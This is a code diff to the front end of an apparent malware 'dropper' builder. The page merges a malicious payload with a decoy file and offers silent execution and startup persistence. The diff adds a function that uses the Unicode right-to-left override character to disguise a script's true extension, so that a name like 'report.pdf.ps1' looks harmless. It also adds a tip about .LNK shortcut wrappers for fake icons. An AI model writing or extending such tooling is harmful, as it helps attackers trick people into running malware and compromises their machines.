@@ -17,6 +17,7 @@ import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
 import { mergePayloads } from '@/actions/merge-payload-action';
+import { Checkbox } from '@/components/ui/checkbox';
 
 const formSchema = z.object({
   payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
@@ -24,6 +25,7 @@ const formSchema = z.object({
   iconFile: z.any().optional(),
   outputName: z.string().min(1, "Output name is required."),
   dropperBehavior: z.string(),
+  extensionSpoofing: z.boolean().default(false),
 });
 
 const dropperBehaviors = ['Run Silently', 'Drop & Exec (Temp)', 'Persistence (Startup)'];
@@ -40,8 +42,28 @@ export default function MergingStationPage() {
     defaultValues: {
       outputName: 'update_installer.ps1',
       dropperBehavior: 'Run Silently',
+      extensionSpoofing: false,
     },
   });
+
+ const applyExtensionSpoofing = (filename: string): string => {
+    const parts = filename.split('.');
+    if (parts.length < 2) return filename; // Not enough parts to spoof
+
+    const realExtension = parts.pop();
+    const visiblePart = parts.join('.');
+    
+    const lastPart = parts.pop();
+    if (!lastPart) return filename;
+
+    const visibleExtension = lastPart;
+    const baseName = parts.join('.');
+
+    const reversedVisibleExtension = visibleExtension.split('').reverse().join('');
+    
+    // e.g., for "report.pdf.exe", this creates "report.exe[RTO]fdp"
+    return `${baseName}.${realExtension}\u202E${reversedVisibleExtension}`;
+ };
 
  const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
     setIsBuilding(true);
@@ -77,9 +99,13 @@ export default function MergingStationPage() {
         
         log('Dropper script generated successfully.');
 
-        setFinalOutput({ name: values.outputName, content: response.scriptContent });
+        const finalName = values.extensionSpoofing
+            ? applyExtensionSpoofing(values.outputName)
+            : values.outputName;
+
+        setFinalOutput({ name: finalName, content: response.scriptContent });
         
-        log(`Build complete. Output file: ${values.outputName}`);
+        log(`Build complete. Output file: ${finalName}`);
         toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });
 
     } catch (e: any) {
@@ -129,7 +155,7 @@ export default function MergingStationPage() {
                 <CardContent className="space-y-4">
                   <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
@@ -139,6 +165,23 @@ export default function MergingStationPage() {
                   <FormField control={form.control} name="outputName" render={({ field }) => (
                     <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
                   )} />
+                   <FormField
+                        control={form.control}
+                        name="extensionSpoofing"
+                        render={({ field }) => (
+                          <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
+                            <FormControl>
+                              <Checkbox checked={field.value} onCheckedChange={field.onChange} />
+                            </FormControl>
+                            <div className="space-y-1 leading-none">
+                              <FormLabel>Enable Extension Spoofing</FormLabel>
+                              <FormDescription>
+                                Use RLO character to mask the true extension. E.g., name `report.pdf.ps1`.
+                              </FormDescription>
+                            </div>
+                          </FormItem>
+                        )}
+                      />
                   <FormField control={form.control} name="dropperBehavior" render={({ field }) => (
                         <FormItem><FormLabel>Dropper Behavior</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{dropperBehaviors.map(b=><SelectItem key={b} value={b}>{b}</SelectItem>)}</SelectContent></Select></FormItem>
                   )} />
